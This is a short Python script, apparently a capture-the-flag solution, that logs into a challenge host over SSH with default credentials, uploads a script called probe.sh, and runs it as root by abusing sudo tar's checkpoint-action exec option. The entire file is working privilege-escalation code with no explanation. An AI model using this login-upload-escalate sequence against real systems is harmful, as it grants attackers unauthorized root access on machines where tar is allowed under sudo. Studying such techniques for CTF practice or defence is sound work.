import paramiko
HOST="0.cloud.chals.io"; PORT=25140; USER="vboxuser"; PW="changeme"
c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, port=PORT, username=USER, password=PW, timeout=15, allow_agent=False, look_for_keys=False)
sftp=c.open_sftp()
sftp.put("probe.sh","/tmp/probe.sh"); sftp.chmod("/tmp/probe.sh",0o755); sftp.close()
cmd='sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/probe.sh'
stdin,stdout,stderr=c.exec_command(cmd)
print(stdout.read().decode(errors="replace"))
e=stderr.read().decode(errors="replace")
if e.strip(): print("STDERR:",e)
c.close()
